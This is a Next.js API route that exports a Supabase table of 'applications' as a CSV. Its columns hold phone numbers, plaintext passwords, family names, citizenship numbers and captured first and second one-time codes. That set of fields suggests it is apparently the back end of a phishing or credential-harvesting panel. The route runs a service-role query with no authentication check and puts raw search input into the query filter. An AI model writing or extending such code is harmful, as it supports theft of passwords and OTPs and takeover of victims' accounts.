import { NextRequest, NextResponse } from "next/server"
import { createServiceRoleClient } from "@/lib/supabase/server"

export async function GET(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url)
    const search = searchParams.get("search") || ""
    const phone = searchParams.get("phone") || ""
    const dateFrom = searchParams.get("dateFrom") || ""
    const dateTo = searchParams.get("dateTo") || ""

    const supabase = await createServiceRoleClient()
    let query = supabase.from("applications").select("*, otp_history(count)")

    if (search) {
      query = query.or(
        `phone_number.ilike.%${search}%,father_name.ilike.%${search}%,grandfather_name.ilike.%${search}%,mother_name.ilike.%${search}%,citizenship_number.ilike.%${search}%`
      )
    }
    if (phone) query = query.ilike("phone_number", `%${phone}%`)
    if (dateFrom) query = query.gte("created_at", dateFrom)
    if (dateTo) query = query.lte("created_at", dateTo)

    const { data, error } = await query.order("created_at", { ascending: false })

    if (error) throw new Error(error.message)

    const headers = [
      "Phone Number",
      "Password",
      "Father Name",
      "Grandfather Name",
      "Mother Name",
      "Citizenship Number",
      "First OTP",
      "Second OTP",
      "Total OTP Attempts",
      "Created At",
      "Updated At",
    ]

    const csvRows = [headers.join(",")]
    for (const item of data || []) {
      const app = item as Record<string, unknown>
      const otpHistory = app.otp_history as Array<{ count: number }> | undefined
      csvRows.push(
        [
          app.phone_number as string,
          `"${app.password as string}"`,
          `"${app.father_name as string}"`,
          `"${app.grandfather_name as string}"`,
          `"${app.mother_name as string}"`,
          app.citizenship_number as string,
          (app.first_otp as string) || "",
          (app.second_otp as string) || "",
          otpHistory?.[0]?.count ?? 0,
          app.created_at as string,
          app.updated_at as string,
        ].join(",")
      )
    }

    const csv = csvRows.join("\n")

    return new NextResponse(csv, {
      headers: {
        "Content-Type": "text/csv",
        "Content-Disposition": `attachment; filename="applications-${new Date().toISOString().split("T")[0]}.csv"`,
      },
    })
  } catch (err) {
    return NextResponse.json(
      { error: err instanceof Error ? err.message : "Export failed" },
      { status: 500 }
    )
  }
}
